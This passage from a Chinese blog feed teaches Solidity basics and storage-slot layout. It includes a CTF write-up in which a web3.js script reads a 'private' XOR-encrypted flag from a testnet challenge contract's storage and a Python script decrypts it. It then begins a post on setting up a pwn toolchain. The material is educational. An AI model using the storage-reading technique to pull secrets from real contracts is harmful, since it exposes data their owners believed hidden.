<li><a class="link"   href="https://remix.ethereum.org/" >Remix<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>：一个在线IDE，用于编辑合约以及与合约交互。</li>
<li><a class="link"   href="https://faucets.chain.link/" >Fauctes<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>：水龙头，可以用来免费获取测试网络中免费的货币。</li>
<li><a class="link"   href="https://app.infura.io/" >infura<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>：可以获取apikey，用于web3开发测试。</li>
</ul>
<h3 id="2-存储类型"><a href="#2-存储类型" class="headerlink" title="2.存储类型"></a>2.<strong>存储类型</strong></h3><p>Solidity 主要有三种存储类型：</p>
<ul>
<li><strong>storage</strong>：永久存储，存储在区块链上，所有合约状态变量（如 <code>uint256 totalSupply;</code>）都是存储在这里。每次修改都会消耗 gas。</li>
<li><strong>memory</strong>：临时存储，存储在内存中，生命周期仅在当前调用期间。函数调用结束后，数据会被清除。适用于需要临时使用的数据，如函数内部的计算结果。</li>
<li><strong>calldata</strong>：用于函数参数的只读数据存储位置，数据存在于外部调用时的输入中，通常用于优化 gas 使用。</li>
</ul>
<h3 id="3-修饰符"><a href="#3-修饰符" class="headerlink" title="3.修饰符"></a>3.修饰符</h3><h4 id="1）访问修饰符"><a href="#1）访问修饰符" class="headerlink" title="1）访问修饰符"></a>1）<strong>访问修饰符</strong></h4><ul>
<li><strong><code>public</code></strong>：函数或变量可以被任何合约或外部账户访问。</li>
<li><strong><code>private</code></strong>：函数或变量只能在定义它的合约内部访问，其他合约无法访问。</li>
<li><strong><code>internal</code></strong>：函数或变量只能在当前合约及其子合约中访问，外部合约无法访问。</li>
<li><strong><code>external</code></strong>：函数只能被外部账户或其他合约调用，不能在合约内部调用。</li>
</ul>
<h4 id="2）状态修饰符"><a href="#2）状态修饰符" class="headerlink" title="2）状态修饰符"></a>2）<strong>状态修饰符</strong></h4><ul>
<li><strong><code>view</code></strong>：函数不会修改区块链状态，且可以读取合约的状态变量。调用此函数不会消耗 gas。</li>
<li><strong><code>pure</code></strong>：函数不读取或修改任何状态变量，也不访问任何合约的状态。它只能使用传入的参数。调用此函数同样不会消耗 gas。</li>
<li><strong><code>payable</code></strong>：函数可以接收 ETH。用于处理涉及资金转移的功能。</li>
</ul>
<h4 id="3）其他常用修饰符"><a href="#3）其他常用修饰符" class="headerlink" title="3）其他常用修饰符"></a>3）<strong>其他常用修饰符</strong></h4><ul>
<li><strong><code>require</code></strong>：用于验证条件是否为真，如果条件不满足，则抛出异常并撤销交易。常用于输入验证和权限检查。</li>
<li><strong><code>assert</code></strong>：用于检查不应发生的条件，如果条件不满足，则抛出异常并撤销交易。通常用于内部错误和不变性验证。</li>
<li><strong><code>revert</code></strong>：显式撤销交易，并可以返回错误消息。与 <code>require</code> 类似，但可以用于更复杂的条件检查。</li>
</ul>
<h4 id="4）自定义修饰符"><a href="#4）自定义修饰符" class="headerlink" title="4）自定义修饰符"></a>4）自定义修饰符</h4><p>常见的是用于权限控制。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">modifier onlyOwner &#123;</span><br><span class="line">    require(msg.sender == owner, &quot;Not the contract owner&quot;);</span><br><span class="line">    _;			//_;用于替换实际的执行逻辑</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function restrictedFunction() public onlyOwner &#123;</span><br><span class="line">    // 只有合约的拥有者可以执行此函数</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h4 id="5）Fallback-函数"><a href="#5）Fallback-函数" class="headerlink" title="5）Fallback 函数"></a>5）<strong>Fallback 函数</strong></h4><p>特殊的函数，当合约接收到 ETH 但没有匹配的函数调用时会被执行。可以用于接收资金。</p>
<h3 id="4-常用内置函数以及全局变量"><a href="#4-常用内置函数以及全局变量" class="headerlink" title="4.常用内置函数以及全局变量"></a>4.常用内置函数以及全局变量</h3><ul>
<li><code>abi.encodePacked</code> 是 Solidity 中的一个内置函数，用于将多个参数编码为一个字节数组。它在处理数据时非常有用，特别是在需要进行哈希计算、合约交互或其他数据处理时。</li>
<li><code>Keccak256</code>： 将输入数据（无论大小）转换为固定长度的输出（256 位），即 32 字节的哈希值。</li>
<li><code>msg.sender</code>：指向当前运行合约账户的地址</li>
<li><code>tx.origin</code>：存着整个调用链最原始的调用者的地址，及交易的原始发起方</li>
</ul>
<h3 id="5-从示例看基础语法"><a href="#5-从示例看基础语法" class="headerlink" title="5.从示例看基础语法"></a>5.从示例看基础语法</h3><p>example：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// WelcomeSHCTF2024.sol</span><br><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract WelcomeSHCTF2024 &#123;</span><br><span class="line"></span><br><span class="line">    string public storedFlag;</span><br><span class="line"></span><br><span class="line">    constructor(string memory flag) &#123;</span><br><span class="line">        string memory xorResult = xorWithSHCTF(flag);</span><br><span class="line">        storedFlag = xorResult;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function xorWithSHCTF(string memory flag) internal pure returns (string memory) &#123;</span><br><span class="line">        bytes memory flagBytes = bytes(flag);</span><br><span class="line">        bytes memory xorKey = bytes(&quot;shctf&quot;);</span><br><span class="line">        bytes memory result = new bytes(flagBytes.length);</span><br><span class="line"></span><br><span class="line">        for (uint256 i = 0; i &lt; flagBytes.length; i++) &#123;</span><br><span class="line">            result[i] = bytes1(uint8(flagBytes[i]) ^ uint8(xorKey[i % xorKey.length]));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return string(result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function verifyXORedFlag(string memory inputFlag) public view returns (bool) &#123;</span><br><span class="line">        return keccak256(abi.encodePacked(storedFlag)) == keccak256(abi.encodePacked(xorWithSHCTF(inputFlag)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<ul>
<li><code>pragma solidity ^0.8.0;</code>：指明合约是用 Solidity 编写的，并且要求编译器版本为 0.8.0 或更高。</li>
<li><code>contract</code>：中文译为合约，类似与class，实际上就是声明一个对象。</li>
<li><code>string private storedFlag</code>：这个就很熟悉了，就是类型+访问修饰符+变量名的组合，声明一个变量</li>
<li><code>constructor(params)&#123;&#125;</code>：这个就是该合约的构造函数，在创建时会接受参数并初始化</li>
<li><code>function</code>：声明一个方法，参数可以带上修饰符，后面也可以跟上若干修饰符</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">interface IWelcomeSHCTF2024 &#123;</span><br><span class="line">    function verifyXORedFlag(string memory inputFlag) external view returns (bool);</span><br><span class="line">    function storedFlag() external view returns (string memory);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract exp&#123;</span><br><span class="line">    IWelcomeSHCTF2024 public tar;</span><br><span class="line"></span><br><span class="line">    constructor(address contractAddress) &#123;</span><br><span class="line">        // 使用给定的地址初始化合约实例</span><br><span class="line">        tar = IWelcomeSHCTF2024(contractAddress);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function xorWithSHCTF(string memory flag) internal pure returns (string memory) &#123;</span><br><span class="line">        bytes memory flagBytes = bytes(flag);</span><br><span class="line">        bytes memory xorKey = bytes(&quot;shctf&quot;);</span><br><span class="line">        bytes memory result = new bytes(flagBytes.length);</span><br><span class="line"></span><br><span class="line">        for (uint256 i = 0; i &lt; flagBytes.length; i++) &#123;</span><br><span class="line">            result[i] = bytes1(uint8(flagBytes[i]) ^ uint8(xorKey[i % xorKey.length]));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return string(result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getFlag() public view returns (string memory) &#123;</span><br><span class="line">        // 调用 WelcomeSHCTF2024 合约的 verifyXORedFlag 函数</span><br><span class="line">        return xorWithSHCTF(tar.storedFlag());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>我们也可以写一个与上述实例相交互的脚本，这里我们假设上面的storedFlag是个public变量，其中要先定义一个<code>interface</code>接口，里面要写这个接口中能被外部调用的方法，也就是有external或public修饰的方法，其具体定义可以直接复制源码中方法的定义。这样定义之后，我们就可以通过传入合约实例的地址，来创建这么一个接口实例，然后就能调用该实例对外公开的方法。要访问属性的话要通过getter方法，也就是多的一句<code>function storedFlag() external view returns (string memory);</code>来实现属性的接口调用。我们可以在本地做实验以验证。</p>
<h5 id="remix合约部署"><a href="#remix合约部署" class="headerlink" title="remix合约部署"></a>remix合约部署</h5><p>可以先创建一个新的工作区，选择default project就行。然后在contracts目录下新建自己合约文件，如<code>WelcomeSHCTF2024.sol</code>以及<code>exp.sol</code>，然后选择编译器版本后进行编译，之后转到<code>Deploy &amp; run transactions</code>界面。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/08/solidity-blockchain%E5%88%9D%E6%8E%A2/image-20241005161027491.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/08/solidity-blockchain%E5%88%9D%E6%8E%A2/image-20241005161608582.png"
                      class=""
                >
<p>在环境上选Remix VM（与实际的测试网交互要选WalletConnect来连接到自己的账户），然后我们可以在deploy部署前输入一个flag字符串，作为该合约的constructor的参数。点击deploy进行合约的部署。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/08/solidity-blockchain%E5%88%9D%E6%8E%A2/image-20241005161816606.png"
                      class=""
                >
<p>部署成功后底下Deployed Contracts会显示出内容，我们可以通过点击按钮来调用各个接口，有些接口的调用我们需要传参。可以发现我们的public变量也可以作为接口调用，点击storedFlag就能获取到原合约异或加密后的storedFlag的值</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/08/solidity-blockchain%E5%88%9D%E6%8E%A2/image-20241005162140584.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/08/solidity-blockchain%E5%88%9D%E6%8E%A2/image-20241005162816996.png"
                      class=""
                >
<p>然后我们复制一下这个自己部署的合约的地址，在编译完exp.sol后，在CONTRACT中选择exp.sol，传入刚才部署的合约地址用以接口调用。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/08/solidity-blockchain%E5%88%9D%E6%8E%A2/image-20241007174515117.png"
                      class=""
                >
<p>成功以后，用我们之前编写的getFlag外部方法，就能直接获取到我们之前部署的flag了，这样能够获取到public存储的flag密文。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/08/solidity-blockchain%E5%88%9D%E6%8E%A2/image-20241007174257776.png"
                      class=""
                >
<h3 id="6-存储层面"><a href="#6-存储层面" class="headerlink" title="6.存储层面"></a>6.存储层面</h3><p>这个感觉在ctf解题中是很重要的，感觉ctf-wiki中已经讲的很好了，这里我再整理一遍吧。</p>
<h4 id="插槽"><a href="#插槽" class="headerlink" title="插槽"></a>插槽</h4><p>以太坊数据存储会为合约的每项数据指定一个可计算的存储位置，存放在一个容量为 2^256 的超级数组中，数组中每个元素称为插槽，其初始值为 0。虽然数组容量的上限很高，但实际上存储是稀疏的，只有非零 (空值) 数据才会被真正写入存储。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 插槽式数组存储</span><br><span class="line">----------------------------------</span><br><span class="line">|               0                |     # slot 0</span><br><span class="line">----------------------------------</span><br><span class="line">|               1                |     # slot 1</span><br><span class="line">----------------------------------</span><br><span class="line">|               2                |     # slot 2</span><br><span class="line">----------------------------------</span><br><span class="line">|              ...               |     # ...</span><br><span class="line">----------------------------------</span><br><span class="line">|              ...               |     # 每个插槽 32 字节</span><br><span class="line">----------------------------------</span><br><span class="line">|              ...               |     # ...</span><br><span class="line">----------------------------------</span><br><span class="line">|            2^256-1             |     # slot 2^256-1</span><br><span class="line">----------------------------------</span><br></pre></td></tr></table></figure></div>
<p>当数据长度是已知时，其具体的存储位置将在编译时指定，而对于长度不确定的类型（如动态数组、映射），则会按一定规则计算存储位置。以下是对不同类型变量的储存模型的具体分析。</p>
<h4 id="存储规则"><a href="#存储规则" class="headerlink" title="存储规则"></a>存储规则</h4><ul>
<li>存储插槽以低位对齐方式存储，在图上直观表示就是右对齐</li>
<li>每个基本类型只占存储它们所需字节</li>
<li>一个插槽内能存多个类型</li>
<li>如果存储插槽中的剩余空间不足以储存一个基本类型，那么它会被移入下一个存储插槽</li>
<li>结构和数组数据总是会占用一整个新插槽（但结构或数组中的各项，都会以这些规则进行打包）</li>
</ul>
<h5 id="一般存法"><a href="#一般存法" class="headerlink" title="一般存法"></a>一般存法</h5><p>如以下合约： </p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.0;</span><br><span class="line"></span><br><span class="line">contract C &#123;</span><br><span class="line">    address a;      // 0</span><br><span class="line">    uint8 b;        // 0</span><br><span class="line">    uint256 c;      // 1</span><br><span class="line">    bytes24 d;      // 2</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>其存储布局如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----------------------------------------------------</span><br><span class="line">| unused (11) | b (1) |            a (20)           | &lt;- slot 0</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">|                       c (32)                      | &lt;- slot 1</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">| unused (8) |                d (24)                | &lt;- slot 2</span><br><span class="line">-----------------------------------------------------</span><br></pre></td></tr></table></figure></div>
<h5 id="动态数组存法"><a href="#动态数组存法" class="headerlink" title="动态数组存法"></a>动态数组存法</h5><p>会占用对应位置 <code>p</code> 处的插槽，用以储存数组的长度，而数组真正的起始点会位于 <code>keccak256(p)</code> 处</p>
<p>如以下合约： </p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.0;</span><br><span class="line"></span><br><span class="line">contract C &#123;</span><br><span class="line">    uint256 a;      // 0</span><br><span class="line">    uint[] b;       // 1</span><br><span class="line">    uint256 c;      // 2</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>其存储布局如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----------------------------------------------------</span><br><span class="line">|                      a (32)                       | &lt;- slot 0</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">|                    b.length (32)                  | &lt;- slot 1</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">|                      c (32)                       | &lt;- slot 2</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">|                        ...                        |   ......</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">|                      b[0] (32)                    | &lt;- slot `keccak256(1)`</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">|                      b[1] (32)                    | &lt;- slot `keccak256(1) + 1`</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">|                        ...                        |   ......</span><br><span class="line">-----------------------------------------------------</span><br></pre></td></tr></table></figure></div>
<h5 id="字节数组和字符串存法"><a href="#字节数组和字符串存法" class="headerlink" title="字节数组和字符串存法"></a>字节数组和字符串存法</h5><p>如果 <code>bytes</code> 和 <code>string</code> 的数据很短，那么它们的长度也会和数据一起存储到同一个插槽。具体地说：如果数据长度小于等于 31 字节， 则它存储在高位字节（左对齐），最低位字节存储 <code>length * 2</code>。如果数据长度超出 31 字节，则在主插槽存储 <code>length * 2 + 1</code>， 数据照常存储在 <code>keccak256(slot)</code> 中。</p>
<h5 id="映射存法"><a href="#映射存法" class="headerlink" title="映射存法"></a>映射存法</h5><p>对于映射，其会占据位置 <code>p</code> 处的一个插槽，但该插槽不会被真正使用。映射中的键 <code>k</code> 所对应的值会位于 <code>keccak256(k . p)</code>， 其中 <code>.</code> 是连接符。如果该值同时是一个非基本类型，则将 <code>keccak256(k . p)</code> 作为偏移量来找到具体的位置。</p>
<p>如以下合约： </p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.0;</span><br><span class="line"></span><br><span class="line">contract C &#123;</span><br><span class="line">    mapping(address =&gt; uint) a;      // 0</span><br><span class="line">    uint256 b;                       // 1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>其存储布局如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----------------------------------------------------</span><br><span class="line">|                    reserved (a)                   | &lt;- slot 0</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">|                      b (32)                       | &lt;- slot 1</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">|                        ...                        |   ......</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">|                     a[addr] (32)                  | &lt;- slot `keccak256(addr . 0)`</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">|                        ...                        |   ......</span><br><span class="line">-----------------------------------------------------</span><br></pre></td></tr></table></figure></div>
<h4 id="不同类型所占字节数"><a href="#不同类型所占字节数" class="headerlink" title="不同类型所占字节数"></a>不同类型所占字节数</h4><p>X={8,16,24,32,40,48,56,64,128,256}    N={x|1&lt;=x&lt;=16,x=32}</p>
<p>表中{x}代表X集合中某个元素，{n}表示N集合中某个元素，？？？为动态类型数据</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">类型</th>
<th style="text-align:center">大小（字节）</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">address</td>
<td style="text-align:center">20</td>
</tr>
<tr>
<td style="text-align:center">address payable</td>
<td style="text-align:center">20</td>
</tr>
<tr>
<td style="text-align:center">bool</td>
<td style="text-align:center">1</td>
</tr>
<tr>
<td style="text-align:center">uint{x}</td>
<td style="text-align:center">{x}/8</td>
</tr>
<tr>
<td style="text-align:center">int{x}</td>
<td style="text-align:center">{x}/8</td>
</tr>
<tr>
<td style="text-align:center">bytes{n}</td>
<td style="text-align:center">{n}</td>
</tr>
<tr>
<td style="text-align:center">bytes（动态字节数组）</td>
<td style="text-align:center">？？？</td>
</tr>
<tr>
<td style="text-align:center">string（动态字符串）</td>
<td style="text-align:center">？？？</td>
</tr>
<tr>
<td style="text-align:center">结构体、数组、映射</td>
<td style="text-align:center">？？？</td>
</tr>
</tbody>
</table>
</div>
<h3 id=""><a href="#" class="headerlink" title=" "></a> </h3><h3 id="7-题目分析"><a href="#7-题目分析" class="headerlink" title="7.题目分析"></a>7.题目分析</h3><h5 id="SHCTF-just-Signin"><a href="#SHCTF-just-Signin" class="headerlink" title="[SHCTF] just Signin"></a>[SHCTF] just Signin</h5><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/08/solidity-blockchain%E5%88%9D%E6%8E%A2/image-20241005161451526.png"
                      class=""
                >
<p>先看题目提供的合约，其中有存了一个flag，然后我们可以从外部调用verifyXORedFlag来验证我们输入的flag是否正确，但显然我们不可能直接去爆破flag的值，这时候我们参考ctf-wiki中关于<code>Ethereum Storage</code>的介绍。</p>
<blockquote>
<p>由于以太坊上的所有信息都是公开的，所以即使一个变量被声明为 private，我们仍能读到变量的具体值。</p>
<p>利用 web3 提供的 <code>web3.eth.getStorageAt()</code> 方法，可以读取一个以太坊地址上指定位置的存储内容。所以只要计算出了一个变量对应的插槽位置，就可以通过调用该函数来获得该变量的具体值。`</p>
</blockquote>
<p>那么我们就可以去用web3这个js库编写脚本来分析插槽内容。根据内存存储的规则，string类型的变量是动态分配内存的，由于存的内容大于31字节，所以该位置slot0会存大小，而keccak256(0)中会存实际内容。而且由于内容大于32字节，所以我们要连续读几个插槽，这里读两个就能读到全部内容了。</p>
<p>在写脚本过程中还遇到了几个坑：</p>
<ul>
<li>直接keccak256(0)出来的插槽位置中是全空的，实际上我们要得到的插槽位置在keccak256(abi.encodePacked(0))中，也就是在keccak256(‘0x0000000000000000000000000000000000000000000000000000000000000000’)中。</li>
<li>其中用npm装web3库时后面测试运行时会报错，原因是我拿apt装的nodejs版本较低，解决方法是拿nvm重装高版本nodejs。</li>
<li><code>const web3 = new Web3(&quot;https://sepolia.infura.io/v3/your_api&quot;);</code>这个创建实例一开始我后面的url不知道填什么，从ChainList找了几个url填进去，然后会发现对应地址处的插槽是全空的，显然是找错链了。后面在infura注册后用里面的测试网络sepolia能够正确找到对应合约。</li>
</ul>
<div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// const Web3 = require(&#x27;web3&#x27;);</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Web3</span> <span class="keyword">from</span> <span class="string">&#x27;web3&#x27;</span>;</span><br><span class="line"><span class="comment">// 连接到 Sepolia 测试网络（你需要替换成合适的提供商 URL）</span></span><br><span class="line"><span class="keyword">const</span> web3 = <span class="keyword">new</span> <span class="title class_">Web3</span>(<span class="string">&quot;https://sepolia.infura.io/v3/your_api&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 合约地址（在题目中提供的地址）</span></span><br><span class="line"><span class="keyword">const</span> contractAddress = <span class="string">&quot;0x3948DF4C50B1671eaa6b22876Ea746899a6916C1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取存储的 private 变量 storedFlag</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">getPrivateVariable</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 读取存储插槽的数据</span></span><br><span class="line">        <span class="keyword">const</span> data = <span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(contractAddress, <span class="number">0</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Stored len in slot 0:`</span>, data);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> startSlot = <span class="keyword">await</span> <span class="title class_">BigInt</span>(web3.<span class="property">utils</span>.<span class="title function_">keccak256</span>(<span class="string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000000&#x27;</span>));</span><br><span class="line">        <span class="comment">// 要读取的起始插槽</span></span><br><span class="line">        <span class="keyword">const</span> numSlots = <span class="number">2</span>; <span class="comment">// 要读取的插槽数量</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; numSlots; i++) &#123;</span><br><span class="line">            <span class="keyword">const</span> slot = startSlot + <span class="title class_">BigInt</span>(i);</span><br><span class="line">            <span class="keyword">const</span> storageData = <span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(contractAddress, slot);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Data at slot <span class="subst">$&#123;slot&#125;</span>:`</span>, storageData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`Error reading slot:`</span>, error);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">getPrivateVariable</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/08/solidity-blockchain%E5%88%9D%E6%8E%A2/image-20241005142240033.png"
                      class=""
                >
<p>然后我们就能得到经过异或加密的密文，简单解密回去后就能得到flag</p>
<p>python解密exp</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">enc = [<span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">8</span>, <span class="number">31</span>, <span class="number">6</span>, <span class="number">69</span>, <span class="number">5</span>, <span class="number">28</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">43</span>, <span class="number">18</span>, <span class="number">28</span>, <span class="number">55</span>, <span class="number">23</span>, <span class="number">28</span>, <span class="number">85</span>, <span class="number">44</span>, <span class="number">10</span>, <span class="number">82</span>, <span class="number">27</span>, <span class="number">5</span>, <span class="number">24</span>, <span class="number">43</span>, <span class="number">11</span>, <span class="number">21</span>, <span class="number">15</span>, <span class="number">29</span>, <span class="number">55</span>, <span class="number">20</span>, <span class="number">68</span>, <span class="number">20</span>, <span class="number">31</span>, <span class="number">12</span>, <span class="number">30</span>]</span><br><span class="line">key = <span class="string">&#x27;shctf&#x27;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">    ch = enc[i] ^ <span class="built_in">ord</span>(key[i%<span class="number">5</span>])</span><br><span class="line">    flag += <span class="built_in">chr</span>(ch)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(flag))</span><br></pre></td></tr></table></figure></div>
]]></content>
      <categories>
        <category>BlockChain</category>
      </categories>
      <tags>
        <tag>BlockChain</tag>
        <tag>solidity</tag>
      </tags>
  </entry>
  <entry>
    <title>快速在24.04Ubuntu搭建pwn环境</title>
    <url>/blog/2025/01/24/%E5%BF%AB%E9%80%9F%E5%9C%A824-04Ubuntu%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/</url>
    <content><![CDATA[<h2 id="快速在24-04Ubuntu搭建pwn环境"><a href="#快速在24-04Ubuntu搭建pwn环境" class="headerlink" title="快速在24.04Ubuntu搭建pwn环境"></a>快速在24.04Ubuntu搭建pwn环境</h2><p>打了重庆市赛时，3个pwn题有2个给了2.39glibc，据有些大师傅们说，2.39的glibc只能在24.04的Ubuntu上兼容，我也试了试用<code>glibc-all-in-one</code>，下2.39的glibc，但是下下来是空的。这说明原先22.04Ubuntu的环境已经不够用了，需要新建一个24.04版本的Ubuntu虚拟机来应对各种可能的做题环境。这里顺便记录下快速起pwn环境的步骤。</p>
<h3 id="安装清单"><a href="#安装清单" class="headerlink" title="安装清单"></a>安装清单</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwntools</span><br><span class="line">ROPgadget</span><br><span class="line">seccomp-tools</span><br><span class="line">glibc-all-in-one</span><br><span class="line">patchelf</span><br><span class="line">pwndbg</span><br><span class="line">one_gadget</span><br></pre></td></tr></table></figure></div>
<h3 id="0-安装24-04Ubuntu"><a href="#0-安装24-04Ubuntu" class="headerlink" title="0.安装24.04Ubuntu"></a>0.安装24.04Ubuntu</h3><p>这里我选择wsl的安装，直接安装完成后，打开会自动进行进一步的安装以及初始化。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/01/24/%E5%BF%AB%E9%80%9F%E5%9C%A824-04Ubuntu%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/image-20241209111313097.png"
                      class=""
                >
<h3 id="1-更新系统"><a href="#1-更新系统" class="headerlink" title="1. 更新系统"></a>1. 更新系统</h3><p>首先，确保你的系统是最新的：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt update &amp;&amp; <span class="built_in">sudo</span> apt upgrade -y</span><br></pre></td></tr></table></figure></div>
<h3 id="2-安装基本工具"><a href="#2-安装基本工具" class="headerlink" title="2. 安装基本工具"></a>2. 安装基本工具</h3><p>安装一些常用的开发工具和库：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install -y build-essential gdb python3 python3-pip git</span><br></pre></td></tr></table></figure></div>
<h3 id="3-安装-pwntools"><a href="#3-安装-pwntools" class="headerlink" title="3. 安装 pwntools"></a>3. 安装 pwntools</h3><p><code>pwntools</code> 是 PWN 环境中常用的 Python 库，用于编写漏洞利用脚本：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pip3 install pwntools</span><br></pre></td></tr></table></figure></div>
<p>可能会有报错如下：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/01/24/%E5%BF%AB%E9%80%9F%E5%9C%A824-04Ubuntu%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/image-20241209111731629.png"
                      class=""
                >
<p>由于 Ubuntu 24.04 使用了<code>externally-managed-environment</code>模式，这种模式下系统不允许直接用 <code>pip</code> 安装全局包。为了避免对系统 Python 环境造成破坏，所以要创建一个虚拟环境来安装 Python 包。</p>
<p><strong>解决方法：使用虚拟环境</strong></p>
<ol>
